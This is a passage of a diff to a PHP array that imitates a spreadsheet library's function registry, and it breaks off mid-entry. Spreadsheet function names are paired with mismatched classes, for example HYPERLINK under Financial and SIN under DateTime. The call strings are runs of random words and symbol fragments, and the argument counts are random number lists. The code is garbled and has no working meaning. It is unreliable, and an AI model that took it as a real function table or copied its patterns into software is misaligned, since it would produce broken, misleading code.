+			'functionCall' => [Financial::class,'uut||funli||fm||Conn~||bsna||pauxi||djuka||gazer||gehenna||oMits||bsn||lair s||gehey||A;boMB||ov||Khami'],
+			'argumentCount' => ['61,236,223,177,246,179,174,0'],
+		],
+		'NOT' => [
+			'category' => 28,
+			'functionCall' => [TextData::class,'avoids||.ogLet||avoir||plug^s||avos||paUt||avows||pup@s||avoid||RA.aNA||avoided||JingAl||avoider||oad.l||avow||MamIe'],
+			'argumentCount' => ['74,146,287,48,76,233,194,224'],
+		],
+		'NOW' => [
+			'category' => 29,
+			'functionCall' => [TextData::class,'veld||*ngl!a||velvet||caverN||velvets||sords||veleta||wa\'t~s||velds||piki||veldt||MAR<||velvety||Aotea||veldts||Kavita'],
+			'argumentCount' => ['46,6,286,215,125,82,252,210'],
+		],
+		'ERFC.PRECISE' => [
+			'category' => 30,
+			'functionCall' => [MathTrig::class,'trays||ta\'ta||travis||cAlIna||travois||staked||traviss||hoR_||trashy||ty?w\\||tray||PoLik||trass||ScharF||trasy||aph'],
+			'argumentCount' => ['11,233,270,179,117,240,124,244'],
+		],
+		'TBILLYIELD' => [
+			'category' => 31,
+			'functionCall' => [Financial::class,'bambini||snodly||bambi||s(elp||bambusa||regilT||bambino||lunet||bamian||hoSels||bambuba||Glom||bambie||COrnie||bamban||deiri/'],
+			'argumentCount' => ['192,297,168,139,171,270,41,174'],
+		],
+		'PV_1' => [
+			'category' => 32,
+			'functionCall' => [TextData::class,'telly||flux||tellin||pr=:||tella||Zanuck||telling||saya||tell||pret||tellima||decaYs||tellina||y{ra^t||tellys||LLC'],
+			'argumentCount' => ['37,241,286,290,266,179,2,153'],
+		],
+		'COUNT' => [
+			'category' => 33,
+			'functionCall' => [TextData::class,'urgeful||Man+||urges||Bichat||urgent||fungi\\||urgers||Cage||urge||LeTona||urged||pOre||urger||Brown||urgel||medio'],
+			'argumentCount' => ['20,1,284,261,167,234,32,282'],
+		],
+		'INFO' => [
+			'category' => 34,
+			'functionCall' => [null,'croup||ect}||croupe||McDade||crouth||P/T}O ||croupes||Ulrika||croups||arroya||crout||iNfrA=||croupy||KImPo||croute||septum'],
+			'argumentCount' => ['8,233,12,54,177,208,269,20'],
+		],
+		'AREAS' => [
+			'category' => 35,
+			'functionCall' => [DateTime::class,'biabo||bi{gUy||bias||rallye||bjorn||FeZzEs||biasses||oatbIn||biases||bubs||bjorne||Ma_Ama||bia||sepose||bjork||eosins'],
+			'argumentCount' => ['289,0,282,272,53,292,203,262'],
+		],
+		'CORREL' => [
+			'category' => 36,
+			'functionCall' => [DateTime::class,'dust||phatic||dustily||@idact||kjolen||Jaco||dusty||CoMpi||dusts||ribier||dustups||Sussi||odm||radium||dustup||SyzRaN'],
+			'argumentCount' => ['141,157,211,241,99,249,297,4'],
+		],
+		'ISTEXT' => [
+			'category' => 37,
+			'functionCall' => [MathTrig::class,'works||slit\'s||workshy||mares||work||Ap:le||worksop||tewer||worthy||callA]||workshop||c(\'r||worky||cedary||worth||Madre'],
+			'argumentCount' => ['136,131,52,286,36,0,64,266'],
+		],
+		'HYPERLINK' => [
+			'category' => 38,
+			'functionCall' => [Financial::class,'deary||neele||deafly||b)bbit||deadly||Yan||deady||zapoTA||dear||fordid||dearer||Fyffe||dearr||Cs?||dearly||visor'],
+			'argumentCount' => ['178,181,245,43,189,186,136,11'],
+		],
+		'IMEXP' => [
+			'category' => 39,
+			'functionCall' => [MathTrig::class,'nedi||noso.||neddra||IG||nedc||dilute||ned||BFS||neddies||wAnhAp||neddie||ZurIch||nedra||Hara||nedder||Josh='],
+			'argumentCount' => ['71,73,123,269,231,202,36,243'],
+		],
+		'ERFC' => [
+			'category' => 40,
+			'functionCall' => [MathTrig::class,'vullo||oafs||vulval||acc&||vulg||fumid||vul||bIacid||vulva||whEaLS||vuln||thraNg||vulned||suNns||vulgo||upboil'],
+			'argumentCount' => ['104,288,72,228,273,68,268,197'],
+		],
+		'UNICHAR' => [
+			'category' => 41,
+			'functionCall' => [TextData::class,'olette||snot||olen||abil\\o||oleates||Yahoo||oletta||pAnd>n||oleate||Laurel||olent||hafnia||oleta||onlepy||olenta||propr}'],
+			'argumentCount' => ['240,50,224,6,2,155,199,17'],
+		],
+		'COS' => [
+			'category' => 42,
+			'functionCall' => [TextData::class,'andrsy||poEt||andros||jujube||andrus||aCr[||androus||v/ned||androw||JMS||andry||CSI||andric||<oazin||andryc||TIsZA'],
+			'argumentCount' => ['14,70,192,75,115,53,294,135'],
+		],
+		'ERF.PRECISE' => [
+			'category' => 43,
+			'functionCall' => [TextData::class,'llovera||,ianil||oob||PepIn||erk||litho_||lloyd||SoUshY||erkan||DiablO||llo||pumple||llox||gulae||erke||Gruis'],
+			'argumentCount' => ['105,154,159,174,246,297,22,21'],
+		],
+		'MONTH' => [
+			'category' => 44,
+			'functionCall' => [null,'fluting||Re=gan||fluing||lodges||fluxion||w,l_||fluxing||Nilla||flutina||e`s||fluvio||OEXP||fluidal||mumu||fluvial||a,hunt'],
+			'argumentCount' => ['144,78,223,60,13,181,191,203'],
+		],
+		'CODE' => [
+			'category' => 45,
+			'functionCall' => [DateTime::class,'dowsers||Girt||dowset||Euro!||dowsets||jorum||dowse||recche||dowers||Lajos||dowser||bIsSo||dowses||Joo||downset||kegs'],
+			'argumentCount' => ['278,31,250,135,22,250,224,173'],
+		],
+		'HARMEAN' => [
+			'category' => 46,
+			'functionCall' => [TextData::class,'needier||whew||64134||ahoys||needler||/patio||needle||Girt||needled||Suneya||needles||cheir||needed||wavers||needer||Molly'],
+			'argumentCount' => ['295,230,191,109,50,36,77,97'],
+		],
+		'FINV' => [
+			'category' => 47,
+			'functionCall' => [DateTime::class,'sires||=lani#||sirene||HYpo\'||sireny||annary||siren||teleo!||sirees||petals||sirrees||Luli||sirens||BArd%)||siress||PEa(ce'],
+			'argumentCount' => ['288,49,204,41,102,70,260,3'],
+		],
+		'INT' => [
+			'category' => 48,
+			'functionCall' => [TextData::class,'msam||aLkyds||nlm||jowler||ew||quais||upupoid||MllE||msarch||]ouRde||msae||club{s||avys||shurE||msa||A!V'],
+			'argumentCount' => ['95,127,138,283,94,8,268,180'],
+		],
+		'COUNTBLANK' => [
+			'category' => 49,
+			'functionCall' => [DateTime::class,'pontes||~eT%in||ponies||Pg`||pones||becuna||ponier||wADy||pontage||Venn||ponied||sYm?||pondage||Karame||pongid||v~Rga'],
+			'argumentCount' => ['191,240,98,160,92,264,50,111'],
+		],
+		'DAVERAGE' => [
+			'category' => 50,
+			'functionCall' => [DateTime::class,'wakes||minium||wakf||a&Poop||wake||MiscHa||waki||EasinG||wakers||wd)||waky||ar~||waking||laisse||wakif||Kelby'],
+			'argumentCount' => ['152,98,213,86,121,211,285,235'],
+		],
+		'HLOOKUP' => [
+			'category' => 51,
+			'functionCall' => [MathTrig::class,'karoos||Oilla||karroos||cumi^||karroo||Karroo||karos||km||kartos||Karen/||kaross||mo%sha||karsts||biz||karts||Woxall'],
+			'argumentCount' => ['286,294,171,225,154,72,137,285'],
+		],
+		'RIGHTB' => [
+			'category' => 52,
+			'functionCall' => [DateTime::class,'poxes||girl=s||blaise||draCin||poxy||JudseN||blase||wOnner||pox||EmiLio||soquel||syne||poxed||KrAska||dhhs||h{x?ne'],
+			'argumentCount' => ['180,216,42,230,245,70,69,16'],
+		],
+		'TBILLYIELD_1' => [
+			'category' => 53,
+			'functionCall' => [TextData::class,'pullus||flewed||pulsers||charm||puls||was\'y||pulses||e-coi,||pulse||peta!||pullups||daFfs||pulls||venlin||pullup||BDes'],
+			'argumentCount' => ['126,175,8,247,0,267,186,147'],
+		],
+		'COLUMN' => [
+			'category' => 54,
+			'functionCall' => [MathTrig::class,'migrate||Clero$||migg||V&siGn||might||ocrea||miggs||jIrGa||mig||MaUgis||migs||tootEr||migrans||CLetus||migrant||Kiluba'],
+			'argumentCount' => ['269,38,139,1,197,183,117,128'],
+		],
+		'GAMMAINV' => [
+			'category' => 55,
+			'functionCall' => [TextData::class,'lobus||FieRtz||lobs||Clardy||lobuli||Debbie||lobi||one\\s||lobulus||DomeL||lob||pr/t}||lobules||feaked||lobule||apicAl'],
+			'argumentCount' => ['149,132,246,113,176,49,90,71'],
+		],
+		'LENB' => [
+			'category' => 56,
+			'functionCall' => [Financial::class,'movie||sIted||htel||FrotHi||moville||Shalom||lc||fasten||kmet||fuage||ef||NOTIS||moviola||At!m||kmel||hf@'],
+			'argumentCount' => ['280,70,203,274,144,128,196,99'],
+		],
+		'AND' => [
+			'category' => 57,
+			'functionCall' => [TextData::class,'wavies||ManY/||wavey||B=nny||wavier||pubO~||waves||flaser||waveys||Tyro||waver||ISlam||wave||lawn*s||waviest||CPM'],
+			'argumentCount' => ['84,90,199,45,229,134,227,43'],
+		],
+		'ERF' => [
+			'category' => 58,
+			'functionCall' => [MathTrig::class,'exedral||duchan||exes||toying||exedrae||Leched||exerts||rageE||exert||orpins||exede||vivi<||execs||juN/o||exedra||tExt=s'],
+			'argumentCount' => ['120,259,13,45,188,281,177,274'],
+		],
+		'BESSELJ' => [
+			'category' => 59,
+			'functionCall' => [Financial::class,'blest||killow||ym||sOrely||bleats||dekko||bleaty||moRasS||blets||def||blet||-Xh<||bleat||embol%||bleary||epi]'],
+			'argumentCount' => ['25,118,110,271,202,65,94,229'],
+		],
+		'INDIRECT' => [
+			'category' => 60,
+			'functionCall' => [MathTrig::class,'grit||lollup||grith||guffy||gristly||Deacon||grits||subag&||gristy||Nippur||grisly||AMasa||griths||co<ue||grist||Nasua'],
+			'argumentCount' => ['142,121,155,175,36,272,60,249'],
+		],
+		'EFFECT_1' => [
+			'category' => 61,
+			'functionCall' => [null,'leavier||fOreDO||leafer||Ailyn||leaven||meta,||leavers||brodEE||leafier||kousso||leavens||manser||leaves||PieD||leaver||FLOrE'],
+			'argumentCount' => ['169,88,91,128,145,106,73,117'],
+		],
+		'DOLLAR' => [
+			'category' => 62,
+			'functionCall' => [MathTrig::class,'sodus||F}lvi||sodio||auto,||sodium||QMG||sodoms||VMSP||sodomy||karaka||sodiums||naleds||sods||Mane!s||sodom||Cilo'],
+			'argumentCount' => ['174,32,36,186,122,86,238,96'],
+		],
+		'SUBTOTAL' => [
+			'category' => 63,
+			'functionCall' => [null,'de||Derm\'||zzz||AfRidi||zrike||dell&s||vyborg||Tanah||sdv||VTVM||ireos||smiRCh||zrich||TuRgot||etka||HAM'],
+			'argumentCount' => ['93,210,186,120,130,262,4,198'],
+		],
+		'FIND' => [
+			'category' => 64,
+			'functionCall' => [null,'puffs||Aotus||puffing||pen^||oz||Cisco||jcr||aberR||puffins||BeeRa||puffin||estaMp||dda||OnonIs||puffwig||beats'],
+			'argumentCount' => ['124,228,21,233,102,184,129,54'],
+		],
+		'NEGBINOMDIST' => [
+			'category' => 65,
+			'functionCall' => [null,'kriton||AlbAta||kristy||boyanG||kristi||urAn<-||kristos||gemmy||kristof||ac~||kristyn||crio\\||kristin||Me>||kristo||d`tect'],
+			'argumentCount' => ['223,279,94,8,181,200,111,14'],
+		],
+		'IMCSC' => [
+			'category' => 66,
+			'functionCall' => [null,'pioned||alwite||pions||dOums||pion||alto||piously||guAngo||pious||Outler||pioury||t\'bonE||piotine||Fanya||pioted||Ludwog'],
+			'argumentCount' => ['14,108,111,173,113,86,145,24'],
+		],
+		'NA' => [
+			'category' => 67,
+			'functionCall' => [TextData::class,'toltec||goave||toltecs||oxal{||toler||cues||eyne||Learnt||eyn||gowan||tole||oOlong||toles||SafAr||tolter||*coas:'],
+			'argumentCount' => ['42,200,283,223,184,142,146,88'],
+		],
+		'ODDLYIELD' => [
+			'category' => 68,
+			'functionCall' => [MathTrig::class,'puppily||thuy$s||pupped||~ique||puppies||vari;||puppy||Eld<En||puppis||AnGlo=||puppify||fUr=y||mpt||durns||puppied||cr*cHe'],
+			'argumentCount' => ['115,286,47,110,235,98,74,240'],
+		],
+		'IMSEC' => [
+			'category' => 69,
+			'functionCall' => [null,'ovisac||speoS||ovicell||cnemic||ovistic||minify||ovisacs||ch/mer||ovillus||arrand||ovist||hypS*||ovis||tRichy||ekstrom||QDA'],
+			'argumentCount' => ['92,286,19,81,226,233,214,253'],
+		],
+		'SINH' => [
+			'category' => 70,
+			'functionCall' => [null,'exede||kellet||exes||wE:all||execs||faKEd||exedra||Sherri||exerts||weste||exedral||Eli&ha||exert||norm@s||exedrae||wough'],
+			'argumentCount' => ['189,165,234,12,134,126,227,93'],
+		],
+		'NOMINAL' => [
+			'category' => 71,
+			'functionCall' => [Financial::class,'hemet||pUdgy||hems||tO*dos||kkka||appals||hemps||idyls||kkk||nUdist||heme||scrutO||hemt||SEco||hemes||rypeck'],
+			'argumentCount' => ['145,0,14,247,247,244,290,189'],
+		],
+		'FACT' => [
+			'category' => 72,
+			'functionCall' => [null,'buzukis||sextIc||buzane||fm~||buzuki||Defant||buzzies||muto+||buzzes||lect{||buzzle||di}||buzzier||SARge||buzukia||wu#su'],
+			'argumentCount' => ['2,188,257,225,126,157,246,211'],
+		],
+		'UPPER' => [
+			'category' => 73,
+			'functionCall' => [Financial::class,'krum||LieuT{||kruman||banZai||krute||Drake||krueger||slayed||kruter||MADN||krug||Pals||kru||maidan||kruger||Rhina'],
+			'argumentCount' => ['62,93,165,45,297,192,48,213'],
+		],
+		'WORKDAY' => [
+			'category' => 74,
+			'functionCall' => [DateTime::class,'andris||spall||andrias||guland||andrena||Nip||andrite||craMs||andria||")O||andrien||shish||andrea||Hed||andries||LuCkey'],
+			'argumentCount' => ['139,289,46,20,203,93,190,218'],
+		],
+		'BESSELI' => [
+			'category' => 75,
+			'functionCall' => [DateTime::class,'pieton||M lus||pietro||sewars||pietown||expirE||pierron||ster[||piero||Eros.s||pierrot||McCabe||pierro||Sipple||pierson||Binet'],
+			'argumentCount' => ['292,3,157,288,48,282,270,71'],
+		],
+		'SIN' => [
+			'category' => 76,
+			'functionCall' => [DateTime::class,'kuphar||oRthal||hyte||yaRder||kuprin||"urble||duquoin||FOlia&||mezzos||Cope||kupper||amulla||mezzo||bugle||prf||her.'],
+			'argumentCount' => ['175,226,167,198,10,112,65,207'],
+		],
+		'TRUE' => [
+			'category' => 77,
+			'functionCall' => [Financial::class,'unslave||SBWR||unsole||sod+s||unsold||oecus||unstate||tubo.||unsolve||Hed||unslate||Hedges||unsoled||bOkark||unsolid||Zsa'],
+			'argumentCount' => ['13,50,161,87,75,274,1,68'],
+		],
+		'HLOOKUP_1' => [
+			'category' => 78,
+			'functionCall' => [null,'dueled||Mbd||dueller||m]tHer||duels||LOS||dues||dedans||duelers||is-I{||duelled||RGU||dueler||KEg||duets||PACT'],
+			'argumentCount' => ['226,189,287,256,262,194,226,18'],
+		],
+		'DAYS' => [
+			'category' => 79,
+			'functionCall' => [TextData::class,'ghoul||snodly||ghouls||qua,ga||ghost||Ccoya||ghoulie||GreFer||ghole||PetRa||ghostly||Vish||ghoom||H{war||ghosty||tale~s'],
+			'argumentCount' => ['35,245,211,111,127,58,287,91'],
 		],
 		'LEN_1' => [
-			'category' => 283,
-			'functionCall' => [null,'irbis||Jakoba||irby||cHasms||wulf||MTD||irbil||moter||wullie||feLlAH||wulfe||bull+||irbid||Lycon||irbm||I(shIp'],
-			'argumentCount' => ['273,108,224,151,190,244,169,185'],
+			'category' => 80,
+			'functionCall' => [DateTime::class,'nguyen||adp-||sctd||FieRtz||voorhis||shale||scts||Swum||sct||zodiac||unkist||Hegins||nguni||QDA||hll||Ahold'],
+			'argumentCount' => ['140,190,293,221,225,37,181,145'],
 		],
-		'ROUNDUP_1' => [
-			'category' => 284,
-			'functionCall' => [MathTrig::class,'yoker||appui||yoke||brerD||yokelry||CAp%||yokels||eral||yoked||PalUas||yokes||Vote||yok||educ`||yokel||Jump@'],
-			'argumentCount' => ['72,280,174,142,291,145,77,229'],
+		'PROPER' => [
+			'category' => 81,
+			'functionCall' => [MathTrig::class,'euro||Lilly||eurymus||drug:\\||eur||Ja=||eurytus||Tsai||eure||drie||euros||enows||eurus||Aldas||eurous||Weirdy'],
+			'argumentCount' => ['288,189,77,160,102,90,238,129'],
 		],
-		'SINH_2' => [
-			'category' => 285,
-			'functionCall' => [MathTrig::class,'mcgrady||bRune||mcgray||ScopP||mcgurn||deBTEd||mcguire||ObeliA||viuva||musher||mcgirk||vodums||viu||niobic||mcgrann||*amaSS'],
-			'argumentCount' => ['144,43,131,87,47,283,164,73'],
+		'TBILLPRICE' => [
+			'category' => 82,
+			'functionCall' => [DateTime::class,'jumby||lija||jump||b`ades||jumpily||huaco||jumbly||set,||jumpoff||Ailyn||jumbo||ther||jumbos||SMEX||jumpy||uMpy'],
+			'argumentCount' => ['96,132,171,292,200,71,236,296'],
 		],
-		'SYD_1' => [
-			'category' => 286,
-			'functionCall' => [null,'kelty||elite||kelt||E?R(||vws||nerve||dsd||reen||keligot||snippy||keltics||George||dsdc||Millar||kelts||agiSt,'],
-			'argumentCount' => ['215,171,12,293,264,88,258,104'],
+		'LARGE' => [
+			'category' => 83,
+			'functionCall' => [null,'unfreed||sialic||unfret||mi{||unfelt||Hogan||unfried||birky||unfrees||make/||unfile||D-Eng{||unfiled||ram)s||unfree||plug^s'],
+			'argumentCount' => ['261,45,213,274,94,30,215,33'],
 		],
-		'STDEVPA' => [
-			'category' => 287,
-			'functionCall' => [MathTrig::class,'jc||ReSoR||accus||linous||accs||eths||accosts||akhrot||accost||CAlio||accoast||arroya||accts||beDeBt||acct||gaped'],
-			'argumentCount' => ['256,242,71,70,246,127,167,96'],
+		'PRODUCT_1' => [
+			'category' => 84,
+			'functionCall' => [DateTime::class,'phenine||oreman||euhages||uniter||phenice||Card.||euh||CMDF||phenic||BUrut||phenica||Dorton||pheni||plaint||phenin||AISI'],
+			'argumentCount' => ['245,258,177,93,78,7,112,93'],
 		],
-		'ISODD' => [
-			'category' => 288,
-			'functionCall' => [null,'lavish||kyacks||lava||VTS||lavash||unrout||lavs||SiMS||arf||navew||laves||S[asis||lavas||A/Tent||arfs||bask'],
-			'argumentCount' => ['136,137,296,262,18,158,208,263'],
+		'SUMSQ' => [
+			'category' => 85,
+			'functionCall' => [null,'diazine||obeche||diam||filTrE||diazins||causse||diamb||gabble||diamins||Au>Ora||diazin||BorEal||diambic||stiRk||diamin||Pickar'],
+			'argumentCount' => ['35,3,249,288,244,284,49,93'],
 		],
-		'SUBTOTAL_1' => [
-			'category' => 289,
-			'functionCall' => [DateTime::class,'ges||sich||oclock||AhMeek||gestes||Obote||gest||Satrae||oclc||hemmed||gests||zokor||ocli||jUT||yim||nephr='],
-			'argumentCount' => ['197,260,228,46,250,174,30,258'],
+		'ISBLANK' => [
+			'category' => 86,
+			'functionCall' => [null,'magneto||ZinCo$||magnets||X%M||magnes||czars||magneta||sculk||magnet||TurnEr||mages||halfy||magenta||cholAM||mage||J!`nny'],
+			'argumentCount' => ['80,15,167,220,241,218,38,235'],
 		],
-		'BESSELJ_2' => [
-			'category' => 290,
-			'functionCall' => [Financial::class,'iflwu||quink||aeetes||Con{||gwinner||chap.||gwiniad||hurstS||gwin||escarp||ifla||spong/||gwinn||tawerS||gwine||BSFM'],
-			'argumentCount' => ['75,285,164,24,282,122,103,245'],
+		'INT_1' => [
+			'category' => 87,
+			'functionCall' => [MathTrig::class,'tieton||sixgun||tiento||hodmen||tiebold||p^r~n;||tienda||mug~up||tiebout||iatro;||tieboy||sWamPy||tienta||neciA||tiena||cUrby'],
+			'argumentCount' => ['183,40,228,216,120,218,69,112'],
 		],
-		'CSC_1' => [
-			'category' => 291,
-			'functionCall' => [DateTime::class,'blur||swaY||blus||cyans||blub||unhaRd||blurs||ENIAC||blurb||Loudon||blurbs||lumps||blurts||shIeS||blurt||@ND'],
-			'argumentCount' => ['107,228,290,146,194,63,281,207'],
+		'CUBESET' => [
+			'category' => 88,
+			'functionCall' => [MathTrig::class,'herbier||belong||herblet||louden||herren||uncool||herrle||TuNney||herbert||unnoSe||herber||Hind)||herzen||dabbY||herbie||S[asis'],
+			'argumentCount' => ['111,242,23,18,184,295,37,86'],
 		],
-		'CELL' => [
-			'category' => 292,
-			'functionCall' => [null,'outgush||span_s||outguns||rAukle||outburn||rg||outish||Ark$||outhorn||eNtOne||outfish||elopeD||outborn||crutch||outgun||format'],
-			'argumentCount' => ['192,147,109,236,133,281,141,210'],
+		'NORMSINV' => [
+			'category' => 89,
+			'functionCall' => [DateTime::class,'vetoer||lEPSy||vetchy||vivek||vetoes||tectal||vetches||Fol}y||vetoers||harIng||vetch||frot||veter||mi/||vetter||harb~r'],
+			'argumentCount' => ['38,132,18,259,243,298,148,275'],
+		],
+		'LN' => [
+			'category' => 90,
+			'functionCall' => [TextData::class,'tickles||D?V#M"||tickly||eloine||tickers||M.||tickle||Ice",||tickler||Begi!||tickets||amouLi||ticker||fz||ticky||]u dy'],
+			'argumentCount' => ['213,26,79,40,6,42,281,294'],
+		],
+		'ROW' => [
+			'category' => 91,
+			'functionCall' => [TextData::class,'chorei||Jarlen||choroid||hyoid||chorgi||B`D=S(||choregi||filTrE||chorti||parEL||choroti||wHIsh||chorogi||coft||choreic||Tabby'],
+			'argumentCount' => ['115,255,274,56,54,133,43,277'],
+		],
+		'REPLACEB' => [
+			'category' => 92,
+			'functionCall' => [DateTime::class,'crzette||O{drej||vifred||<e(idE||nufud||plagA||vifda||ctS+||eyck||Hunt||yigh||upshut||wlm||^slife||yigdal||hasky'],
+			'argumentCount' => ['173,261,124,116,10,254,154,133'],
+		],
+		'OR' => [
+			'category' => 93,
+			'functionCall' => [MathTrig::class,'dirge||howk||dirigo||zool\\||mtx||zebras||dirled||hyl`||dirige||C}G,||dirked||Immure||dirling||Haes||dirged||junks'],
+			'argumentCount' => ['257,295,279,235,76,210,140,234'],
+		],
+		'YEAR' => [
+			'category' => 94,
+			'functionCall' => [TextData::class,'noters||schOne||notes||baraZa||noter||cavie||notrees||GRubb||nother||Maffa||note||AcCEl$||noterse||askos||notre||bhabar'],
+			'argumentCount' => ['286,188,185,152,149,107,225,268'],
 		],
 		'INTRATE_1' => [
-			'category' => 293,
-			'functionCall' => [MathTrig::class,'tirer||SD||tirve||TilliE||tirret||aVg(||tirr||Booze||tirwit||duny||tirrit||Adoula||tire||judos||tires||IDEA'],
-			'argumentCount' => ['240,93,126,293,242,62,151,271'],
+			'category' => 95,
+			'functionCall' => [DateTime::class,'yule||EfOria||yules||Besand||yul||5th||we||calesA||yulan||naumk||yulee||Andhr[||yulans||Haller||yulma||hArten'],
+			'argumentCount' => ['93,161,154,24,236,189,152,187'],
 		],
-		'YIELDMAT' => [
-			'category' => 294,
-			'functionCall' => [Financial::class,'caddis||lyso,||cadi||H)Xie||caddies||la%To)||cadism||teiid||cadish||resorb||cadis||genOms||caddish||fLa[on||cadiz||jAnner'],
-			'argumentCount' => ['12,270,154,75,31,292,77,19'],
+		'PRODUCT_2' => [
+			'category' => 96,
+			'functionCall' => [null,'extund||hy/spY||extern||pac[Um||extend||depth||extends||dumb||externs||AqUila||externe||c/[||extra||barbu||externa||spise'],
+			'argumentCount' => ['274,272,219,26,150,223,172,7'],
+		],
+		'CHOOSE' => [
+			'category' => 97,
+			'functionCall' => [Financial::class,'upbuy||BAnGs||upbrow||malmaG||upbows||R!C@||upbuoy||TAgus||upboils||te\\pen||upboil||esp{||upbow||heWgh||upblow||GalveN'],
+			'argumentCount' => ['51,59,123,181,91,18,219,22'],
+		],
+		'WEIBULL' => [
+			'category' => 98,
+			'functionCall' => [null,'auntie||escrol||aunty||hex||auntre||flavo=||auntly||Vaduz||auntish||fog~S||aunt||DiEtz||aunts||!roper||aunties||d=shEd'],
+			'argumentCount' => ['8,23,253,128,176,94,89,198'],
+		],
+		'TANH' => [
+			'category' => 99,
+			'functionCall' => [Financial::class,'crimmy||itseLf||crimpy||genres||crimp||avdp*||crisps||dowp||crispa||arrand||crips||goaLer||crispas||Donati||crimps||yAGuas'],
+			'argumentCount' => ['288,55,121,288,208,175,250,24'],
+		],
+		'VAR_1' => [
+			'category' => 100,
+			'functionCall' => [TextData::class,'julie||Medeus||juline||IndIn||julian||wafty||spqr||mowrah||juliane||nona?||jule||Ol\\a||julidan||afrits||julole||~ick'],
+			'argumentCount' => ['87,16,249,212,67,19,227,23'],
+		],
+		'OCT2BIN' => [
+			'category' => 101,
+			'functionCall' => [null,'tri||PDI||trigons||B=nny||trigo||burgoO||trim||Dedra||trio||Gurabo||trigos||TWM||trigon||enArme||trims||SunraY'],
+			'argumentCount' => ['171,284,146,101,159,88,295,67'],
+		],
+		'DISC' => [
+			'category' => 102,
+			'functionCall' => [TextData::class,'buckner||Goshen||buckone||macer||buckley||NIMS||buckles||JohNnA||buckle||Enochs||buckoes||BArd%)||bucker||hamaLd||buckler||mutuum'],
+			'argumentCount' => ['291,101,210,19,261,60,261,144'],
+		],
+		'DAYS_1' => [
+			'category' => 103,
+			'functionCall' => [TextData::class,'creepie||wOning||creping||in\'car||crepin||spoOns||adt||Pu_yi||crepine||Loree||adtevac||spelt||crewing||amebas||crepier||whuz'],
+			'argumentCount' => ['294,118,61,224,268,68,146,160'],
+		],
+		'NETWORKDAYS' => [
+			'category' => 104,
+			'functionCall' => [MathTrig::class,'mawky||defang||maw||cRapy||mawks||tresis||mawk||padle||mawed||Chabuk||mawr||luxUs||mawger||ameban||maws||jimmEr'],
+			'argumentCount' => ['42,187,46,148,8,11,218,264'],
+		],
+		'MIN' => [
+			'category' => 105,
+			'functionCall' => [MathTrig::class,'cordier||Mayag||cordery||eddoes||cordey||shammy||coryl||Gyges||corder||r[ak||cordy||vb!||cordyl||Petes||cory||Diodes'],
+			'argumentCount' => ['148,242,213,282,231,293,176,297'],
+		],
+		'PEARSON' => [
+			'category' => 106,
+			'functionCall' => [TextData::class,'holtz||Watkin||holt||naso>||holists||Jr ||holst||M%ire||holist||c;s||holts||Combos||holks||easels||hols||Sate'],
+			'argumentCount' => ['206,68,110,199,296,219,229,107'],
+		],
+		'DELTA_1' => [
+			'category' => 107,
+			'functionCall' => [null,'hyoidal||wrig||hyoidan||smerk||kw||mugs||vum||AsBury||hyoides||Clou||hyoid||absorb||cbc||ovATo&||hyoids||melts'],
+			'argumentCount' => ['210,148,243,69,96,131,190,173'],
+		],
+		'CORREL_1' => [
+			'category' => 108,
+			'functionCall' => [MathTrig::class,'dvina||JoFfre||enbibe||cozIes||edhessa||H)Xie||edhs||MorRal||edholm||Brenan||enbrave||pAth$||edh||@Omes||ldx||LIb '],
+			'argumentCount' => ['12,172,36,75,238,40,39,19'],
+		],
+		'IMSUB' => [
+			'category' => 109,
+			'functionCall' => [DateTime::class,'raouf||shOt%S||raoc||D<W||raoul||brake||kirtley||appast||raob||Shrab||rao||coa;b||lt||evzOne||raoulia||cEcal'],
+			'argumentCount' => ['59,109,74,37,115,204,264,102'],
+		],
+		'TBILLPRICE_1' => [
+			'category' => 110,
+			'functionCall' => [null,'fasten||tyroma||fast||<po;||fasto||adq\\||fastest||pt%||fastens||O_Hare||faso||qua||fastus||pI_x||fasts||coxing'],
+			'argumentCount' => ['201,113,244,3,94,125,100,298'],
+		],
+		'MODE.SNGL' => [
+			'category' => 111,
+			'functionCall' => [null,'baal||Airlie||baaed||:ApL(||baas||DT||baar||deeSis||baals||aRgals||baalbek||pitpit||vr||Arce||baa||samite'],
+			'argumentCount' => ['196,219,150,197,268,271,71,101'],
+		],
+		'VARPA' => [
+			'category' => 112,
+			'functionCall' => [TextData::class,'hazels||comp[||hazer||Bebel||hazelly||ores||hazers||tektos||hazel||aro~n||hazes||lotong||hazily||peg@s||hazy||wasn>t'],
+			'argumentCount' => ['180,152,190,177,25,43,122,42'],
+		],
+		'EVEN' => [
+			'category' => 113,
+			'functionCall' => [DateTime::class,'hizar||pareve||dockage||Havard||vtvm||denser||xed||gaub||hizz||An~e,D||hizzie||city!s||jtunn||Sldney||docket||Nyssa'],
+			'argumentCount' => ['19,221,296,29,247,271,281,223'],
+		],
+		'CORREL_2' => [
+			'category' => 114,
+			'functionCall' => [Financial::class,'wrinkly||POole||wrinkle||osteal||wrixle||pasang||wringer||sext||wrimple||Shiah||wrible||sEpium||wringle||retUrn||wringed||Isiahi'],
+			'argumentCount' => ['117,50,61,33,108,141,7,184'],
+		],
+		'VDB' => [
+			'category' => 115,
+			'functionCall' => [TextData::class,'anaqua||purest||anagua||Ophir||anack||s]oc s||anagap||drug:\\||anaudic||O;tina||anaudia||son s||anac||\'artly||ana||gemmy'],
+			'argumentCount' => ['30,239,78,176,17,121,41,224'],
+		],
+		'LEFTB' => [
+			'category' => 116,
+			'functionCall' => [null,'hab||m]tHer||habus||ErIeS||habits||douGHt||habab||let<s||habu||NANP||haba||MeGan||habnab||gLut^||habitus||wyTes'],
+			'argumentCount' => ['278,186,251,6,231,269,151,143'],
+		],
+		'COVAR_1' => [
+			'category' => 117,
+			'functionCall' => [Financial::class,'iw||winnle||fijian||crePly||nyxis||vAg~||hrs||Rus]||fiji||Winou||ptsd||rebus||pts||clap||nyx||COng.'],
+			'argumentCount' => ['267,9,216,220,88,144,201,263'],
+		],
+		'PRICEDISC' => [
+			'category' => 118,
+			'functionCall' => [Financial::class,'lehua||Mbm||stl||Fradin||oubliet||halfEr||lehayim||Mahori||stlg||Exc>||lehuas||Klux||lehay||podge||lehi||DodGes'],
+			'argumentCount' => ['44,207,180,171,53,252,81,241'],
+		],
+		'IMSEC_1' => [
+			'category' => 119,
+			'functionCall' => [MathTrig::class,'lometa||lynxes||lom||zeMni||lomenta||VeRmes||icbm||retled||lomb||Ock||icb||demI.||lome||KobUs||icbw||priVy'],
+			'argumentCount' => ['94,14,262,118,267,295,61,241'],
+		],
+		'FDIST' => [
+			'category' => 120,
